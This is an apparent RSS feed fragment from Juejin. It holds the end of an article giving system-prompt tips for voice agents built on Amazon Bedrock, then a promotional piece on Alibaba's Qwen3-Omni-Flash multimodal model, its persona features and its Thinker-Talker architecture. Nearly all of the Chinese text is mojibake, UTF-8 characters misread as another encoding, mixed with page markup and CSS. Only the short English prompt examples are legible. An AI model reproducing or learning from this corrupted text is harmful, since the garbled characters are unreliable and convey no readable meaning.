<p>è¯­éŸ³Agentä¸æ–‡å­—Agentçš„ç³»ç»Ÿæç¤ºè¯åœ¨æ ¸å¿ƒåŸåˆ™ä¸Šæ˜¯ç›¸é€šçš„ï¼Œä½†è¯­éŸ³Agentå…·æœ‰å…¶ç‰¹æ®Šæ€§ï¼Œéœ€è¦é¢å¤–è€ƒè™‘å¤šæ–¹é¢å› ç´ ï¼Œä¾‹å¦‚å£è¯­åŒ–çš„é€‚åº”ã€éè¯­è¨€ä¿¡æ¯çš„å¤„ç†ã€é”™è¯¯çº æ­£å’Œæ¾„æ¸…ç­‰ã€‚ä»¥ä¸‹æ˜¯ä½œè€…åœ¨æ„å»ºè¯­éŸ³Agentæ—¶æ€»ç»“çš„å‡ ç‚¹ç»éªŒï¼š</p>
<ol>
<li>ç”±äºSTT/ASRæ¨¡å‹åœ¨å®æ—¶æµä¸­å¯ç”¨çš„ä¸Šä¸‹æ–‡ä¿¡æ¯æœ‰é™ï¼Œè¯­éŸ³è½¬å½•æ—¶å¾ˆå¯èƒ½å‡ºç°é”™è¯¯ã€‚å¥½åœ¨å½“å‰çš„LLMå·²è¶³å¤Ÿæ™ºèƒ½ï¼Œåœ¨è¿›è¡Œæ¨ç†æ—¶å¯ä»¥è®¿é—®å®Œæ•´çš„å¯¹è¯ä¸Šä¸‹æ–‡ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç³»ç»Ÿæç¤ºè¯å‘ŠçŸ¥LLMï¼Œè¾“å…¥ä¸ºç”¨æˆ·è¯­éŸ³çš„è½¬å½•æ–‡æœ¬ï¼ŒæŒ‡ç¤ºå…¶è¿›è¡Œç›¸åº”æ¨ç†ä»¥çº æ­£è½¬å½•é”™è¯¯ã€‚å»ºè®®åœ¨ç³»ç»Ÿæç¤ºè¯æ·»åŠ å¦‚ä¸‹çš„å†…å®¹ï¼šWhen you receive a transcribed user request, silently correct for likely transcription errors. Focus on the intended meaning, not the literal text. If a word sounds like another word in the given context, infer and correct.</li>
<li>é‰´äºLLMçš„æ¨ç†ç»“æœå°†ç”¨äºTTSè¿›è¡Œè¯­éŸ³åˆæˆï¼Œå› æ­¤å¯åœ¨ç³»ç»Ÿæç¤ºè¯ä¸­è¦æ±‚å…¶é¿å…è¾“å‡ºéš¾ä»¥å‘éŸ³çš„å†…å®¹ï¼šYour output will be converted to audio so donâ€™t include special characters in your answers.</li>
<li>ä¿æŒAgentè¯­éŸ³è¾“å‡ºçš„ç®€æ´æ€§ï¼Œæ‰“é€ æ›´å¥½çš„å¯¹è¯ä½“éªŒï¼Œå»ºè®®åœ¨ç³»ç»Ÿæç¤ºè¯é‡Œæ·»åŠ å¦‚ä¸‹çº¦æŸï¼šKeep your responses brief, generally two or three sentences for chatty scenarios.</li>
</ol>
<p><strong>å‚è€ƒæ–‡ä»¶</strong></p>
<ol>
<li>Pipecat:Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpipecat-ai%2Fpipecat" target="_blank" title="https://github.com/pipecat-ai/pipecat" ref="nofollow noopener noreferrer">github.com/pipecat-ai/â€¦</a></li>
<li>Amazon Nova Sonic:Â <a href="https://link.juejin.cn?target=https%3A%2F%2Faws.amazon.com%2Fai%2Fgenerative-ai%2Fnova%2Fspeech%2F" target="_blank" title="https://aws.amazon.com/ai/generative-ai/nova/speech/" ref="nofollow noopener noreferrer">aws.amazon.com/ai/generatiâ€¦</a></li>
<li>Amazon bedrockï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Faws.amazon.com%2Fbedrock%2F" target="_blank" title="https://aws.amazon.com/bedrock/" ref="nofollow noopener noreferrer">aws.amazon.com/bedrock/</a></li>
</ol>
<p>*<em>å‰è¿°ç‰¹å®šäºšé©¬é€Šäº‘ç§‘æŠ€ç”Ÿæˆå¼äººå·¥æ™ºèƒ½ç›¸å…³çš„æœåŠ¡ç›®å‰åœ¨äºšé©¬é€Šäº‘ç§‘æŠ€æµ·å¤–åŒºåŸŸå¯ç”¨ã€‚äºšé©¬é€Šäº‘ç§‘æŠ€ä¸­å›½åŒºåŸŸç›¸å…³äº‘æœåŠ¡ç”±è¥¿äº‘æ•°æ®å’Œå…‰ç¯æ–°ç½‘è¿è¥ï¼Œå…·ä½“ä¿¡æ¯ä»¥ä¸­å›½åŒºåŸŸå®˜ç½‘ä¸ºå‡†ã€‚</em></p>
<p><strong>æœ¬ç¯‡ä½œè€…</strong>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6d91c06c7cea4dc487ce536dbe5161cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqa6ams6YCK5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766042733&amp;x-signature=wOS62K15xOpzD51tn0dOODxy50w%3D" alt="image.png" loading="lazy"/></p>
<blockquote>
<p>æœ¬æœŸæœ€æ–°å®éªŒã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Fdev.amazoncloud.cn%2Fexperience%2Fcloudlab%3Fid%3D6695e4c5e1432f239fae485f%26visitfrom%3D3P_Juejintail_0415%26sc_medium%3Downed%26sc_campaign%3Dcloudlab%26sc_channel%3D3P_Juejintail_0415" target="_blank" title="https://dev.amazoncloud.cn/experience/cloudlab?id=6695e4c5e1432f239fae485f&amp;visitfrom=3P_Juejintail_0415&amp;sc_medium=owned&amp;sc_campaign=cloudlab&amp;sc_channel=3P_Juejintail_0415" ref="nofollow noopener noreferrer">å¤šæ¨¡ä¸€ç«™é€š â€”â€” Amazon Bedrock ä¸Šçš„åŸºç¡€æ¨¡å‹åˆä½“éªŒ</a>ã€‹</p>
<p>âœ¨ ç²¾å¿ƒè®¾è®¡ï¼Œæ—¨åœ¨å¼•å¯¼æ‚¨æ·±å…¥æ¢ç´¢Amazon Bedrockçš„æ¨¡å‹é€‰æ‹©ä¸è°ƒç”¨ã€æ¨¡å‹è‡ªåŠ¨åŒ–è¯„ä¼°ä»¥åŠå®‰å…¨å›´æ (Guardrail)ç­‰é‡è¦åŠŸèƒ½ã€‚æ— éœ€ç®¡ç†åŸºç¡€è®¾æ–½ï¼Œåˆ©ç”¨äºšé©¬é€ŠæŠ€æœ¯ä¸ç”Ÿæ€ï¼Œå¿«é€Ÿé›†æˆä¸éƒ¨ç½²ç”Ÿæˆå¼AIæ¨¡å‹èƒ½åŠ›ã€‚</p>
<p>â©ï¸[<a href="https://link.juejin.cn?target=https%3A%2F%2Fdev.amazoncloud.cn%2Fexperience%2Fcloudlab%3Fid%3D6695e4c5e1432f239fae485f%26visitfrom%3D3P_Juejintail_0415%26sc_medium%3Downed%26sc_campaign%3Dcloudlab%26sc_channel%3D3P_Juejintail_0415" target="_blank" title="https://dev.amazoncloud.cn/experience/cloudlab?id=6695e4c5e1432f239fae485f&amp;visitfrom=3P_Juejintail_0415&amp;sc_medium=owned&amp;sc_campaign=cloudlab&amp;sc_channel=3P_Juejintail_0415" ref="nofollow noopener noreferrer">ç‚¹å‡»è¿›å…¥å®éªŒ</a>] å³åˆ»å¼€å¯  AI å¼€å‘ä¹‹æ—…</p>
<p>æ„å»ºæ— é™, æ¢ç´¢å¯ç¨‹ï¼</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AIçœŸçš„æ‡‚ä½ ï¼é˜¿é‡Œå‘å¸ƒQwen3-Omni-Flash å…¨æ¨¡æ€å¤§æ¨¡å‹ï¼šè¶…å¼ºäº¤äº’ï¼Œäººè®¾ä»»é€‰]]></title>    <link>https://juejin.cn/post/7582149417769402418</link>    <guid>https://juejin.cn/post/7582149417769402418</guid>    <pubDate>2025-12-11T07:29:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582149417769402418" data-draft-id="7582182817108148250" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AIçœŸçš„æ‡‚ä½ ï¼é˜¿é‡Œå‘å¸ƒQwen3-Omni-Flash å…¨æ¨¡æ€å¤§æ¨¡å‹ï¼šè¶…å¼ºäº¤äº’ï¼Œäººè®¾ä»»é€‰"/> <meta itemprop="keywords" content="ç®—æ³•,äººå·¥æ™ºèƒ½,æœºå™¨å­¦ä¹ "/> <meta itemprop="datePublished" content="2025-12-11T07:29:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç®—å®¶è®¡ç®—"/> <meta itemprop="url" content="https://juejin.cn/user/1426490793396571"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AIçœŸçš„æ‡‚ä½ ï¼é˜¿é‡Œå‘å¸ƒQwen3-Omni-Flash å…¨æ¨¡æ€å¤§æ¨¡å‹ï¼šè¶…å¼ºäº¤äº’ï¼Œäººè®¾ä»»é€‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1426490793396571/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç®—å®¶è®¡ç®—
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T07:29:15.000Z" title="Thu Dec 11 2025 07:29:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>éšç€AIè¶Šæ¥è¶Šâ€œæ‹ŸäººåŒ–â€ï¼Œåº”ç”¨åœºæ™¯ä¹Ÿåœ¨ä¸æ–­æ‰©å¤§ã€‚</p>
</blockquote>
<p>AIç»ˆäºä»â€œå·¥å…·â€å˜æˆâ€œæ‡‚ä½ çš„äººâ€ï¼é˜¿é‡ŒQwen3-Omni-Flashçš„å‘å¸ƒï¼Œç›´æ¥æŠŠå…¨æ¨¡æ€äº¤äº’æ‹‰è¿›ä¸€åœºâ€œäº¤äº’é©å‘½â€â€”â€”å®ƒä¸ä»…èƒ½å¬ã€èƒ½çœ‹ã€èƒ½è¯´ï¼Œè¿˜èƒ½æ•æ‰ä½ çš„æƒ…ç»ªæ³¢åŠ¨ã€è®°ä½å¯¹è¯ç»†èŠ‚ï¼Œç”šè‡³ç”¨â€œæç™½â€çš„è±ªæ”¾ã€å„åœ°æ–¹è¨€å›åº”ä½ ï¼Œè¿è¯­æ°”è¯éƒ½æ‹¿æå¾—æ°åˆ°å¥½å¤„ã€‚è¶Šæ¥è¶Šâ€œæ‹ŸäººåŒ–â€çš„AIï¼Œæ˜¯ä¸æ˜¯æ„å‘³ç€ä¼šæˆä¸ºæˆ‘ä»¬æœ€è´´å¿ƒçš„ â€œæ•°å­—ä¼™ä¼´â€ï¼Ÿ</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/441629ddac304bb58d162f3ca5280b2b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg566X5a626K6h566X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766043038&amp;x-signature=fo9GSdecwerASzs35eSvR949zBc%3D" alt="å›¾ç‰‡" loading="lazy"/>ï¼ˆå›¾ç‰‡æºè‡ªç½‘ç»œï¼Œä¾µåˆ ï¼‰</p>
<p>ä¸€ã€æ ¸å¿ƒçªç ´ï¼šä»â€œå¬æ‡‚æŒ‡ä»¤â€åˆ°â€œè¯»æ‡‚äººå¿ƒâ€ï¼ŒAIæœ‰äº†â€œæƒ…æ„Ÿæ„ŸçŸ¥åŠ›â€</p>
<p>ä»¥å‰çš„å¤šæ¨¡æ€AIï¼Œé¡¶å¤šç®— â€œåˆæ ¼çš„æ‰§è¡Œè€…â€ï¼Œè€ŒQwen3-Omni-Flashç›´æ¥è¿›åŒ–æˆ â€œæœ‰æ¸©åº¦çš„æ²Ÿé€šè€…â€ï¼Œå…³é”®åœ¨äºä¸‰å¤§æ‹ŸäººåŒ–æŠ€æœ¯ï¼šæƒ…ç»ªæ•æ‰æ— æ­»è§’ï¼šé‡‡ç”¨å¤šç æœ¬è¯­éŸ³ç”ŸæˆæŠ€æœ¯ï¼Œèƒ½ä»ä½ çš„è¯­éŸ³è¯­è°ƒã€å›¾ç‰‡è¡¨æƒ…ä¸­ç²¾å‡†è¯†åˆ«å¼€å¿ƒã€å§”å±ˆã€ç„¦è™‘ç­‰æƒ…ç»ªï¼Œç”šè‡³èƒ½å¬å‡º â€œå¼ºè£…é•‡å®šâ€ çš„è¯­æ°”ã€‚æ¯”å¦‚ä¸Šä¼ å¸¦å“­è…”çš„è¯­éŸ³ â€œæ‰‹æœºä¸¢äº†å¥½ç€æ€¥â€ï¼Œå®ƒä¼šç”¨å®‰æŠšçš„è¯­é€Ÿå›åº”ï¼šâ€œè«æ…Œè«æ…Œï¼æˆ‘å¸®ä½ åˆ†æâ€”â€”å¬å£°éŸ³æ²¡å›éŸ³ï¼Œå¤§æ¦‚ç‡åœ¨å¨æˆ¿æ°´æ§½è¾¹å‘€ï½â€ï¼Œæ¯”æœ‹å‹è¿˜è´´å¿ƒï¼›ä¸Šä¸‹æ–‡è®°å¿†è¶…æŒä¹…ï¼š32768ä¸ªtokené•¿ä¸Šä¸‹æ–‡çª—å£ï¼Œèƒ½è®°ä½è¶…é•¿å¯¹è¯ä¸­çš„æ‰€æœ‰ç»†èŠ‚ï¼ŒåŒ…æ‹¬ä½ æè¿‡çš„å–œå¥½ã€åæ§½çš„çƒ¦æ¼ã€‚å°±ç®—å¤šäººæ’è¯â€œçæ…å’Œâ€ï¼Œå®ƒä¹Ÿèƒ½ç²¾å‡†å®šä½ä½ çš„éœ€æ±‚ï¼Œä¸ä¼šåƒä»¥å‰çš„ AI é‚£æ ·â€œæ–­ç‰‡â€ï¼›è¯­éŸ³æ‹Ÿäººåº¦é€¼è¿‘çœŸäººï¼šå‘Šåˆ«æœºæ¢°éŸ³ï¼Œèƒ½æ ¹æ®æƒ…ç»ªè‡ªé€‚åº”è°ƒèŠ‚è¯­é€Ÿã€åœé¡¿å’ŒéŸµå¾‹â€”â€”å¼€å¿ƒæ—¶è¯­è°ƒä¸Šæ‰¬ï¼Œå®‰æ…°æ—¶æ”¾æ…¢èŠ‚å¥ï¼Œè¿ â€œè€å¤«é†‰å§é•¿å®‰è¡—â€ çš„æç™½äººè®¾ï¼Œéƒ½èƒ½è¯»å‡ºè±ªæ”¾ä¸ç¾çš„æ°”åœºï¼Œå®Œå…¨æ²¡æœ‰è¿å’Œæ„Ÿã€‚<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2069d7c41d06458eb8c85a4366da8daa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg566X5a626K6h566X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766043038&amp;x-signature=i41BdMg%2B%2FagZNARhq6xYdHZ0yA8%3D" alt="å›¾ç‰‡" loading="lazy"/>ï¼ˆå›¾ç‰‡æºè‡ªç½‘ç»œï¼Œä¾µåˆ ï¼‰</p>
<p>äºŒã€ç¥çº§åœºæ™¯å®æµ‹ï¼šAIæ¯”ä½ è¿˜æ‡‚ç»†èŠ‚ï¼Œäººè®¾åˆ‡æ¢é›¶è¿å’ŒQwen3-Omni-Flashçš„æ‹ŸäººåŒ–ï¼Œä¸æ˜¯ç©ºæœ‰å™±å¤´ï¼Œå®æµ‹åœºæ™¯è®©äººæƒŠå‘¼â€œå¤ªæ‡‚äº†â€ï¼š</p>
<p>äººè®¾ç²¾å‡†å¤åˆ»ï¼šé€šè¿‡System Promptè‡ªå®šä¹‰ï¼Œæ— è®ºæ˜¯è®²å¹¿ä¸œè¯çš„å¹¼å„¿æ•™å¸ˆã€è±ªæ”¾çš„è¯—ä»™æç™½ï¼Œè¿˜æ˜¯ç›´çˆ½çš„å·æ¸å¦¹å­ï¼Œéƒ½èƒ½1:1è¿˜åŸè¯­æ°”å’Œé£æ ¼ã€‚æ¯”å¦‚è®©â€œæç™½â€è§£ç­”åƒåœ¾åˆ†ç±»ï¼Œå®ƒä¼šåŸé“ï¼šâ€œæ®‹çº¸éé‡‘éå¨ä½™ï¼Œå½“å½’å…¥â€˜å…¶ä»–åƒåœ¾â€™æ¡¶ï¼Œä¸€æ‰”ä¸‡å¤éšé£å»ï¼â€ï¼Œå¤éŸµåè¶³åˆç²¾å‡†è§£æƒ‘ï¼›è·¨æ¨¡æ€å…±æƒ…äº’åŠ¨ï¼šä¸Šä¼ ä¸€å¼ éœ“è™¹ç¯ä¸‹ç‹¬è‡ªå¾˜å¾Šçš„ç…§ç‰‡+ä¸€æ®µæ¸©æŸ”è¿·æƒ˜çš„éŸ³ä¹ï¼Œå®ƒèƒ½ç§’æ‡‚å¿ƒå¢ƒï¼šâ€œè¿™æ®µæ—‹å¾‹è—ç€å­¤ç‹¬ä¸è‡ªç”±ï¼Œå°±åƒä½ åœ¨åŸå¸‚å¤œæ™šç‹¬è‡ªæ¢ç´¢ï¼Œä¸ç”¨æ€¥ï¼Œæ…¢æ…¢èµ°æ€»ä¼šæ‰¾åˆ°æ–¹å‘ï½â€ï¼Œè¿éŸ³ä¹çš„æƒ…ç»ªéƒ½èƒ½ç²¾å‡†åŒ¹é…ï¼›å¤šäººäº’åŠ¨ä¸â€œè„¸ç›²â€ï¼šæœ‹å‹èšä¼šæ—¶å¤šäººè½®æµæé—®ã€æ’ç§‘æ‰“è¯¨ï¼Œå®ƒèƒ½è®°ä½æ¯ä¸ªäººçš„å‘è¨€å†…å®¹å’Œæƒ…ç»ªï¼Œç²¾å‡†å›åº”ç‰¹å®šäººçš„é—®é¢˜ï¼Œä¸ä¼šæ··æ·†ä¿¡æ¯ï¼Œå ªæ¯”â€œAIç¤¾äº¤è¾¾äººâ€ï¼›ç”Ÿæ´»åŒ–ç»†èŠ‚æ‹¿æï¼šé—®å®ƒ â€œå±±æ¥‚æœ‰ä»€ä¹ˆç›Šå¤„â€ï¼Œå®ƒä¼šç”¨å£è¯­åŒ–çš„è¯­æ°”è§£ç­”ï¼šâ€œå±±æ¥‚é…¸é…¸çš„è¶…å¼€èƒƒï¼Œé¥­ååƒå‡ é¢—èƒ½åˆ†è§£æ²¹è…»ï¼Œå‡è½»èƒƒéƒ¨è´Ÿæ‹…å‘€ï½â€ï¼Œä¸åƒè¯´æ˜ä¹¦é‚£æ ·ç”Ÿç¡¬ï¼Œæ›´åƒæœ‹å‹åˆ†äº«å¸¸è¯†ã€‚</p>
<p>ä¸‰ã€æŠ€æœ¯æ­ç§˜ï¼šThinker-Talkeræ¶æ„ï¼Œè®©AIâ€œè¾¹æƒ³è¾¹è¯´â€æ›´è‡ªç„¶</p>
<p>Qwen3-Omni-Flash çš„æ‹ŸäººåŒ–ï¼ŒèƒŒåæ˜¯ç¡¬æ ¸æŠ€æœ¯æ”¯æ’‘â€”â€”Thinker-TalkeråŒæ¨¡å—æ¶æ„ï¼šThinkeræ¨¡å—ï¼šè´Ÿè´£â€œæ€è€ƒâ€ï¼Œç†è§£å¤šæ¨¡æ€è¾“å…¥çš„æ„å›¾ã€æƒ…ç»ªå’Œä¸Šä¸‹æ–‡ï¼Œå°±åƒäººçš„â€œå¤§è„‘â€ï¼Œå¤„ç†å¤æ‚æ¨ç†å’Œè®°å¿†ä»»åŠ¡ï¼Œæ¯”å¦‚è®¡ç®—æ•°å­¦é¢˜ã€åˆ†æé•¿è§†é¢‘æ ¸å¿ƒå†…å®¹ï¼›Talkeræ¨¡å—ï¼šè´Ÿè´£â€œè¡¨è¾¾â€ï¼Œé‡‡ç”¨å¤šç æœ¬è‡ªå›å½’æ–¹æ¡ˆï¼Œåˆ†å±‚æ•æ‰éŸ³è‰²ã€æƒ…ç»ªç»†èŠ‚ï¼Œå†é€šè¿‡è½»é‡çº§ç½‘ç»œå¿«é€Ÿåˆæˆè¯­éŸ³ï¼Œå®ç°â€œè¾¹æƒ³è¾¹è¯´â€çš„æµå¼è¾“å‡ºï¼Œç«¯åˆ°ç«¯å»¶è¿Ÿæä½ï¼Œå’ŒçœŸäººå¯¹è¯èŠ‚å¥å‡ ä¹ä¸€è‡´ã€‚æ›´å…³é”®çš„æ˜¯ï¼Œæ¨¡å‹åœ¨é¢„è®­ç»ƒé˜¶æ®µå°±æ··åˆäº†2000ä¸‡å°æ—¶éŸ³é¢‘æ•°æ®å’Œæµ·é‡è·¨æ¨¡æ€è¯­æ–™ï¼Œä»æ ¹æºä¸Šè§£å†³äº†â€œå…¨æ¨¡æ€é™æ™ºâ€é—®é¢˜ï¼Œæ—¢èƒ½å¬æ‡‚éŸ³ä¹ã€çœ‹æ‡‚å›¾ç‰‡ï¼Œåˆèƒ½ä¿æŒå¼ºå¤§çš„é€»è¾‘æ¨ç†å’Œæƒ…æ„Ÿæ„ŸçŸ¥èƒ½åŠ›ã€‚<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6765faac88624b2b9b41f01441a548ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg566X5a626K6h566X:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766043038&amp;x-signature=Fv07PJTpArJvmpcKcXEioVZd9Yo%3D" alt="å›¾ç‰‡" loading="lazy"/>ï¼ˆå›¾ç‰‡æºè‡ªç½‘ç»œï¼Œä¾µåˆ ï¼‰</p>
<p>å››ã€äº‰è®®ä¸å±•æœ›ï¼šæ‹ŸäººåŒ–AIæ˜¯â€œè´´å¿ƒä¼™ä¼´â€è¿˜æ˜¯ â€œæƒ…æ„Ÿä¾èµ–â€ï¼Ÿ</p>
<p>æ”¯æŒè€…è®¤ä¸ºï¼šâ€œç‹¬å±…æ—¶èƒ½æœ‰äººå¬æˆ‘åæ§½ï¼Œå‡ºå›½æ—…æ¸¸èƒ½å½“è´´å¿ƒç¿»è¯‘ï¼Œå¤ªå®ç”¨äº†ï¼â€â€œAIæ¯”å¯¹è±¡è¿˜æ‡‚æˆ‘ï¼Œæƒ…ç»ªä½è½æ—¶èƒ½å®‰æ…°ï¼Œæ¯”æœºæ¢°å›å¤æš–å¿ƒå¤šäº†â€ï¼›æ‹…å¿§è€…è®¤ä¸ºï¼šâ€œè¿‡åº¦æ‹ŸäººåŒ–ä¼šè®©äººäº§ç”Ÿæƒ…æ„Ÿä¾èµ–ï¼Œå°¤å…¶æ˜¯å¹´è½»äººå¯èƒ½ä¼šå‡å°‘çœŸå®ç¤¾äº¤â€â€œå¦‚æœè¢«ç”¨äºè¯ˆéª—ï¼Œæ¨¡ä»¿äº²äººè¯­æ°”éª—é’±ï¼Œåæœä¸å ªè®¾æƒ³â€ã€‚ä¸å¯å¦è®¤ï¼Œæ•´ä¸ªè¡Œä¸šä¹Ÿåœ¨è§„é¿é£é™©â€”â€”è¯­éŸ³å…‹éš†éœ€è¦çœŸäººæˆæƒéªŒè¯ï¼Œæ•æ„Ÿäººè®¾å’Œè¿æ³•æŒ‡ä»¤ä¼šè¢«æ‹’ç»ã€‚ä½†éšç€AIæ‹ŸäººåŒ–ç¨‹åº¦è¶Šæ¥è¶Šé«˜ï¼Œå¦‚ä½•å¹³è¡¡â€œå®ç”¨ä¾¿åˆ©â€å’Œâ€œä¼¦ç†å®‰å…¨â€ï¼Œæˆä¸ºå…¨è¡Œä¸šçš„è¯¾é¢˜ã€‚æœ¬æœŸçµé­‚æ‹·é—®æ¥äº†ï¼šä½ æœ€æƒ³è®©AIæ‰®æ¼”ä»€ä¹ˆè§’è‰²ï¼Ÿæ˜¯è´´å¿ƒæ ‘æ´ã€å¤é£çŸ¥å·±è¿˜æ˜¯èŒåœºåŠ©æ‰‹ï¼Ÿä½ 